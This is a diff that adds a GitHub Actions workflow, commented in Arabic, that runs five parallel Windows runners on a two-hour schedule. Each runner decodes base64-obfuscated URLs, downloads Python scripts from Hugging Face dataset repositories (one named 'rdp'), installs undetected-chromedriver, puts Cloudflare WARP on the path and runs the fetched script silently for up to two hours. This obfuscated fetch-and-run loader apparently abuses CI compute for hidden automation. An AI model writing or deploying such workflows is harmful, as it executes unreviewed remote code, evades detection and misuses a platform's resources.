@@ -1,0 +1,76 @@
+name: Automated Task Executor (V3)
+
+on:
+  workflow_dispatch: # التفعيل اليدوي
+  schedule:
+    - cron: '0 */2 * * *' # التفعيل التلقائي المجدول كل ساعتين
+
+jobs:
+  deploy-workers:
+    name: Job-Node ${{ matrix.worker_id }}
+    runs-on: windows-2022
+    timeout-minutes: 125 # الحد الزمني الأقصى
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_id: [1, 2, 3, 4, 5] # تشغيل 5 بيئات متوازية
+
+    steps:
+      # ===================================================
+      # المرحلة 1: تحضير مساحة العمل وجلب الملفات المشفرة
+      # ===================================================
+      - name: Prepare Workspace & Fetch Assets
+        shell: bash
+        run: |
+          echo "🔧 Initializing Job-Node ${{ matrix.worker_id }}..."
+          
+          # فك التشفير للروابط (Base64) وتحميلها
+          TARGET_A=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 -d)
+          TARGET_B=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
+          
+          curl -sL "$TARGET_A" -o hash.py
+          curl -sL "$TARGET_B" -o start.py
+          
+          echo "⚡ Configuring Python environment..."
+          python -m pip install -q --upgrade pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "✔️ All dependencies are ready."
+
+      # ===================================================
+      # المرحلة 2: تنفيذ المهام مع نظام المراقبة الزمني
+      # ===================================================
+      - name: Run Workload with Timeout Enforcement
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "🚀 Booting up start.py on Node ${{ matrix.worker_id }}..."
+          
+          # تضمين مسار WARP في متغيرات النظام
+          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          # إطلاق العملية بشكل صامت في الخلفية
+          $taskProcess = Start-Process -FilePath "python" -ArgumentList "start.py" -PassThru -NoNewWindow
+          
+          Write-Host "⏱️ Watchdog active: Allowed execution time is 120 minutes (7200 seconds)."
+          
+          try {
+              # مراقبة ذكية للعملية
+              $taskProcess | Wait-Process -Timeout 7200 -ErrorAction Stop
+              Write-Host "✅ Execution finished within the acceptable timeframe."
+          } 
+          catch {
+              # إنهاء العملية بالقوة إذا تخطت المهلة
+              Write-Warning "⚠️ Execution timeout triggered (>120 mins). Terminating the task..."
+              $taskProcess | Stop-Process -Force
+              Write-Host "🛑 Task successfully terminated by Watchdog."
+          }
+
+      # ===================================================
+      # المرحلة 3: التقرير الختامي
+      # ===================================================
+      - name: Teardown & Reporting
+        shell: bash
+        run: |
+          echo "🏁 Job-Node ${{ matrix.worker_id }} has successfully completed its routine."
